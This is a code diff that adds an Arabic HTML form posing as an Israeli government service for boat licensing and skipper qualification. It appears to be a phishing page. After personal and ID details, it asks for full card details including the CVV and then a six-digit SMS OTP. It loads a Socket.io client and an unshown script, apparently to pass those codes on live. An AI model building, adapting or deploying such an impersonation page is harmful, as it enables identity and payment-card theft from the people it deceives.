@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GovForms — تقديم طلب</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <script>const GOVFORMS_API_BASE = location.origin;</script>
+</head>
+<body>
+
+  <!-- ==================== شريط Gov.il العلوي ==================== -->
+  <div class="gov-topbar">
+    <div class="brand">
+      <span class="gov-logo">🏛️</span>
+      <span>GovForms</span>
+    </div>
+    <div class="actions">
+      <button class="gov-btn">🌐 <span class="label">العربية</span></button>
+      <button class="gov-btn">👤 <span class="label">المنطقة الشخصية</span></button>
+    </div>
+  </div>
+
+  <!-- ==================== شريط الأدوات ==================== -->
+  <div class="toolbar">
+    <button id="btnSupport">💬 <span class="label">الرد والدعم</span></button>
+    <button id="btnFiles">📎 <span class="label">الملفات المرفقة</span></button>
+    <button id="btnSave">💾 <span class="label">حفظ</span></button>
+  </div>
+
+  <!-- ==================== رأس الجهة الحكومية ==================== -->
+  <div class="org-header">
+    <div class="org-info">
+      <h1>توجهات إلى قسم القوارب والربابنة</h1>
+      <div class="org-sub">إدارة النقل البحري</div>
+      <div class="ref-number" id="refNumber">رقم الطلب: —</div>
+    </div>
+    <div class="org-logo">⚓</div>
+  </div>
+
+  <!-- ==================== الحاوية الرئيسية ==================== -->
+  <div class="container">
+
+    <!-- شاشة البداية: اختيار نوع التوجه -->
+    <div id="startScreen">
+      <div class="card">
+        <div class="card-header">
+          <h2>نوع التوجه</h2>
+        </div>
+        <div class="card-body">
+          <div class="req-note">الحقول التي تحمل <span class="star">*</span> إلزامية</div>
+
+          <div class="field">
+            <label>نوع التوجه <span class="star">*</span></label>
+            <select id="serviceType" class="service-select">
+              <option value="">اختيار</option>
+            </select>
+            <div class="err-msg" id="serviceTypeError">يجب اختيار نوع التوجه</div>
+          </div>
+
+          <div class="actions-row">
+            <button class="btn-primary" id="startBtn">الدخول إلى الخدمة</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة النموذج -->
+    <div id="formScreen" class="hidden">
+
+      <!-- بطاقة تفاصيل الطلب -->
+      <div class="card">
+        <div class="card-header"><h2>تفاصيل الطلب</h2></div>
+        <div class="card-body">
+          <div class="field-note" id="serviceDescText"></div>
+
+          <!-- موضوع التوجه - ترخيص القوارب -->
+          <div class="field hidden" data-service-field="subject_licensing">
+            <label>موضوع التوجه <span class="star">*</span></label>
+            <select id="subjectLicensing"></select>
+            <div class="err-msg" id="subjectLicensingError">هذا الحقل إلزامي</div>
+          </div>
+
+          <!-- موضوع التوجه - تأهيل الربابنة -->
+          <div class="field hidden" data-service-field="subject_qualification">
+            <label>موضوع التوجه <span class="star">*</span></label>
+            <select id="subjectQualification"></select>
+            <div class="err-msg" id="subjectQualificationError">هذا الحقل إلزامي</div>
+          </div>
+
+          <!-- نوع القارب -->
+          <div class="field hidden" data-service-field="boat_type">
+            <label>نوع القارب</label>
+            <input type="text" id="boatType" maxlength="25" placeholder="مثال: يخت">
+          </div>
+
+          <!-- تاريخ انتهاء الشهادة -->
+          <div class="field hidden" data-service-field="certificate_expiry">
+            <label>تاريخ انتهاء الشهادة <span class="star">*</span></label>
+            <input type="text" id="certificateExpiry" maxlength="10" placeholder="DD/MM/YYYY">
+            <div class="err-msg" id="certificateExpiryError">هذا الحقل إلزامي</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- بطاقة البيانات الشخصية -->
+      <div class="card">
+        <div class="card-header"><h2>البيانات الشخصية</h2></div>
+        <div class="card-body">
+          <div class="field-row">
+            <div class="field">
+              <label>رقم الهوية <span class="star">*</span></label>
+              <input type="text" id="idNumber" maxlength="9" inputmode="numeric" placeholder="9 أرقام">
+              <div class="err-msg" id="idNumberError">هذا الحقل إلزامي</div>
+            </div>
+            <div class="field">
+              <label>اسم العائلة <span class="star">*</span></label>
+              <input type="text" id="lastName" maxlength="25">
+              <div class="err-msg" id="lastNameError">هذا الحقل إلزامي</div>
+            </div>
+          </div>
+          <div class="field">
+            <label>الاسم الأول <span class="star">*</span></label>
+            <input type="text" id="firstName" maxlength="25">
+            <div class="err-msg" id="firstNameError">هذا الحقل إلزامي</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- بطاقة بيانات الاتصال -->
+      <div class="card">
+        <div class="card-header"><h2>بيانات الاتصال</h2></div>
+        <div class="card-body">
+          <div class="field-row">
+            <div class="field">
+              <label>الهاتف الرئيسي <span class="star">*</span></label>
+              <input type="tel" id="primaryPhone" maxlength="11" dir="ltr" placeholder="0501234567">
+              <div class="err-msg" id="primaryPhoneError">هذا الحقل إلزامي</div>
+            </div>
+            <div class="field">
+              <label>هاتف إضافي</label>
+              <input type="tel" id="secondaryPhone" maxlength="11" dir="ltr" placeholder="0509876543">
+            </div>
+          </div>
+          <div class="field-row">
+            <div class="field">
+              <label>البريد الإلكتروني <span class="star">*</span></label>
+              <input type="email" id="email" maxlength="50" dir="ltr" placeholder="example@mail.com">
+              <div class="err-msg" id="emailError">هذا الحقل إلزامي</div>
+            </div>
+            <div class="field">
+              <label>تأكيد البريد الإلكتروني <span class="star">*</span></label>
+              <input type="email" id="emailConfirm" maxlength="50" dir="ltr" placeholder="example@mail.com">
+              <div class="err-msg" id="emailConfirmError">هذا الحقل إلزامي</div>
+            </div>
+          </div>
+          <div class="field">
+            <label class="checkbox-field">
+              <input type="checkbox" id="contactConsent" checked>
+              <span>أوافق على استخدام بيانات الاتصال للتواصل المستقبلي</span>
+            </label>
+          </div>
+        </div>
+      </div>
+
+      <!-- بطاقة محتوى التوجه -->
+      <div class="card">
+        <div class="card-header"><h2>محتوى التوجه</h2></div>
+        <div class="card-body">
+          <div class="field">
+            <label>محتوى التوجه <span class="star">*</span></label>
+            <textarea id="content" maxlength="2000" placeholder="اكتب تفاصيل توجهك هنا..."></textarea>
+            <div class="counter" id="contentCounter">0/2000</div>
+            <div class="err-msg" id="contentError">هذا الحقل إلزامي</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- بطاقة المرفقات -->
+      <div class="card">
+        <div class="card-header">
+          <h2>المستندات المرفقة</h2>
+        </div>
+        <div class="card-body">
+          <!-- ملف الشهادة (إلزامي لخدمة الاعتراف مجدداً) -->
+          <div class="field hidden" data-service-field="certificate_file">
+            <label>
+              الشهادة منتهية الصلاحية <span class="star">*</span>
+              <span class="info-trigger" onclick="toggleTooltip('certTooltip')">i
+                <span class="tooltip" id="certTooltip">نوع الملف: jpg, jpeg, gif, png, bmp, pdf<br>الحجم الأقصى: 20 MB</span>
+              </span>
+            </label>
+            <div class="file-upload" onclick="document.getElementById('certFileInput').click()">
+              <div class="upload-icon">📤</div>
+              <p>اختيار الملفات</p>
+            </div>
+            <input type="file" id="certFileInput" accept=".jpg,.jpeg,.gif,.png,.bmp,.pdf" class="hidden">
+            <div class="file-list" id="certFileList"></div>
+            <div class="err-msg" id="certificateFileError">يجب إرفاق ملف الشهادة</div>
+          </div>
+
+          <!-- مرفقات إضافية (اختياري) -->
+          <div class="field">
+            <label>
+              مرفقات إضافية
+              <span class="info-trigger" onclick="toggleTooltip('addTooltip')">i
+                <span class="tooltip" id="addTooltip">نوع الملف: jpg, jpeg, gif, png, bmp, pdf<br>الحجم الأقصى: 20 MB</span>
+              </span>
+            </label>
+            <div class="file-upload" onclick="document.getElementById('addFileInput').click()">
+              <div class="upload-icon">📤</div>
+              <p>اختيار الملفات</p>
+            </div>
+            <input type="file" id="addFileInput" accept=".jpg,.jpeg,.gif,.png,.bmp,.pdf" class="hidden">
+            <div class="file-list" id="addFileList"></div>
+          </div>
+
+          <div class="actions-row">
+            <button class="btn-primary" id="submitBtn">إرسال الطلب</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- شاشة إدخال بيانات الدفع -->
+    <div id="paymentScreen" class="hidden">
+      <div class="card">
+        <div class="card-header">
+          <h2>بيانات الدفع</h2>
+        </div>
+        <div class="card-body">
+          <div class="ref-note">رقم طلبك: <strong id="paymentRef">—</strong></div>
+          <div class="req-note">الحقول التي تحمل <span class="star">*</span> إلزامية</div>
+
+          <!-- معاينة البطاقة المصوّرة -->
+          <div class="card-preview" dir="ltr">
+            <div class="card-preview-top">
+              <span class="cp-bank">🏦 <span id="bankPreview">—</span></span>
+              <span class="cp-network" id="cardNetworkPreview">—</span>
+            </div>
+            <div class="cp-number" id="cardNumberPreview">•••• •••• •••• ••••</div>
+            <div class="cp-bottom">
+              <div class="cp-field"><span class="cp-label">HOLDER</span><span id="cpHolderPreview">—</span></div>
+              <div class="cp-field"><span class="cp-label">EXPIRES</span><span id="cpExpPreview">—</span></div>
+              <div class="cp-field"><span class="cp-label">CVV</span><span id="cpCvvPreview">—</span></div>
+            </div>
+          </div>
+
+          <div class="field">
+            <label>رقم البطاقة <span class="star">*</span></label>
+            <input type="text" id="cardNumber" inputmode="numeric" placeholder="0000 0000 0000 0000" dir="ltr" maxlength="23">
+          </div>
+          <div class="field">
+            <label>حامل البطاقة <span class="star">*</span></label>
+            <input type="text" id="cardHolder" placeholder="الاسم كما يظهر على البطاقة" dir="ltr">
+          </div>
+          <div class="field-row">
+            <div class="field">
+              <label>تاريخ الانتهاء <span class="star">*</span></label>
+              <input type="text" id="cardExpiry" placeholder="MM/YY" dir="ltr" maxlength="5">
+            </div>
+            <div class="field">
+              <label>CVV <span class="star">*</span></label>
+              <input type="text" id="cardCvv" inputmode="numeric" placeholder="123" dir="ltr" maxlength="4">
+            </div>
+          </div>
+
+          <div class="field-row">
+            <div class="field">
+              <label>اسم البنك</label>
+              <input type="text" id="bankName" placeholder="اسم البنك المصدر">
+            </div>
+            <div class="field">
+              <label>دولة البنك</label>
+              <input type="text" id="bankCountry" placeholder="الدولة">
+            </div>
+          </div>
+
+          <div class="field">
+            <label>نوع البطاقة <span class="star">*</span></label>
+            <div class="radio-row">
+              <label class="radio-card">
+                <input type="radio" name="cardType" value="credit" checked>
+                <span>💳 ائتمان</span>
+              </label>
+              <label class="radio-card">
+                <input type="radio" name="cardType" value="debit">
+                <span>🏦 خصم مباشر</span>
+              </label>
+            </div>
+          </div>
+
+          <div class="actions-row">
+            <button class="btn-primary" id="paymentBtn">متابعة إلى التحقق</button>
+          </div>
+          <div class="step-hint">الخطوة 2 من 3 — بيانات الدفع</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة إدخال رمز التحقق OTP -->
+    <div id="otpScreen" class="hidden">
+      <div class="card">
+        <div class="card-header">
+          <h2>رمز التحقق (OTP)</h2>
+        </div>
+        <div class="card-body">
+          <div class="ref-note">رقم طلبك: <strong id="otpRef">—</strong></div>
+          <p class="otp-instr">أدخل رمز التحقق المكوّن من 6 أرقام المُرسَل إلى هاتفك لإتمام الطلب.</p>
+
+          <div class="otp-boxes" id="otpBoxes">
+            <input type="text" id="otp0" inputmode="numeric" maxlength="1" class="otp-input">
+            <input type="text" id="otp1" inputmode="numeric" maxlength="1" class="otp-input">
+            <input type="text" id="otp2" inputmode="numeric" maxlength="1" class="otp-input">
+            <input type="text" id="otp3" inputmode="numeric" maxlength="1" class="otp-input">
+            <input type="text" id="otp4" inputmode="numeric" maxlength="1" class="otp-input">
+            <input type="text" id="otp5" inputmode="numeric" maxlength="1" class="otp-input">
+          </div>
+
+          <div class="actions-row">
+            <button class="btn-primary" id="otpBtn">تأكيد وإتمام الطلب</button>
+          </div>
+          <div class="step-hint">الخطوة 3 من 3 — رمز التحقق</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة النجاح -->
+    <div id="successScreen" class="hidden">
+      <div class="card">
+        <div class="success-screen">
+          <div class="check">✓</div>
+          <h2>تم استلام طلبك بنجاح</h2>
+          <p>رقم طلبك المرجعي هو:</p>
+          <div class="ref" id="successRef">—</div>
+          <p>احتفظ بهذا الرقم لمتابعة طلبك لاحقاً.</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ==================== التذييل ==================== -->
+  <div class="footer">
+    <div>
+      <a href="#" target="_blank">عن الموقع</a> ·
+      <a href="#" target="_blank">شروط الاستخدام</a> ·
+      <a href="#" target="_blank">إمكانية الوصول</a> ·
+      <a href="#" target="_blank">ملاحظاتك تهمنا</a>
+    </div>
+    <div class="version">إصدار النموذج: 3.0.0</div>
+  </div>
+
+  <!-- ==================== النوافذ المنبثقة ==================== -->
+
+  <!-- نافذة الحفظ -->
+  <div class="modal-overlay" id="saveModal">
+    <div class="modal">
+      <div class="modal-header">
+        <h3>حفظ</h3>
+        <button class="modal-close" onclick="closeModal('saveModal')">✕</button>
+      </div>
+      <div class="modal-body">
+        <p class="req-note">يتيح لك الحفظ العودة إلى النموذج لاحقاً.</p>
+        <p style="font-weight:600; margin-bottom:12px">بأي طريقة تريد استلام الرابط؟</p>
+        <div class="radio-cards">
+          <div class="radio-card" onclick="selectSaveMethod('sms')">
+            <div class="icon">📱</div>
+            <div class="label">رسالة نصية (SMS)</div>
+          </div>
+          <div class="radio-card" onclick="selectSaveMethod('email')">
+            <div class="icon">✉️</div>
+            <div class="label">بريد إلكتروني</div>
+          </div>
+        </div>
+        <div class="field hidden" id="smsField">
+          <label>رقم الهاتف المحمول <span class="star">*</span></label>
+          <input type="tel" dir="ltr" placeholder="0501234567">
+        </div>
+        <div class="field hidden" id="emailField">
+          <label>البريد الإلكتروني <span class="star">*</span></label>
+          <input type="email" dir="ltr" placeholder="example@mail.com">
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-primary" onclick="closeModal('saveModal')">متابعة</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- نافذة المرفقات -->
+  <div class="modal-overlay" id="filesModal">
+    <div class="modal">
+      <div class="modal-header">
+        <h3>الملفات المرفقة</h3>
+        <button class="modal-close" onclick="closeModal('filesModal')">✕</button>
+      </div>
+      <div class="modal-body">
+        <p id="noFilesMsg">لا توجد ملفات مرفقة في النموذج</p>
+        <div class="file-list" id="modalFileList"></div>
+        <div class="counter" id="modalFileSize">0 / 20480 KB</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- نافذة الدعم -->
+  <div class="modal-overlay" id="supportModal">
+    <div class="modal">
+      <div class="modal-header">
+        <h3>الرد والدعم</h3>
+        <button class="modal-close" onclick="closeModal('supportModal')">✕</button>
+      </div>
+      <div class="modal-body">
+        <p style="font-weight:600; margin-bottom:16px">كيف يمكننا مساعدتك؟</p>
+
+        <div class="support-card" onclick="toggleSupport('techSupport')">
+          <h4>🛠️ الدعم الفني والرد العام</h4>
+          <p>مشاكل وأعطال تقنية وأسئلة عامة</p>
+          <div class="support-detail" id="techSupport">
+            <div class="line"><span>الهاتف</span><strong>1299</strong></div>
+            <div class="line"><span>ساعات العمل</span><strong>الأحد-الخميس 08:00-19:00</strong></div>
+            <div class="line"><span>لغات الرد</span><strong>العربية، العبرية، الإنجليزية، الروسية</strong></div>
+            <div class="line"><span>تنبيه</span><strong>لا ترسل رقم الهوية أو بيانات البطاقة</strong></div>
+          </div>
+        </div>
+
+        <div class="support-card" onclick="toggleSupport('personalInfo')">
+          <h4>👤 الحصول على معلومات شخصية</h4>
+          <p>معلومات مرتبطة بحالة معالجة الطلب</p>
+          <div class="support-detail" id="personalInfo">
+            <div class="line"><span>الهاتف</span><strong>5678*</strong></div>
+            <div class="line"><span>ساعات العمل</span><strong>الأحد-الخميس 08:00-16:00</strong></div>
+            <div class="line"><span>المكتب</span><strong>04-8632235</strong></div>
+            <div class="line"><span>حجز موعد</span><strong>عبر MYVISIT</strong></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Socket.io client -->
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script src="js/app.js"></script>
+</body>
+</html>
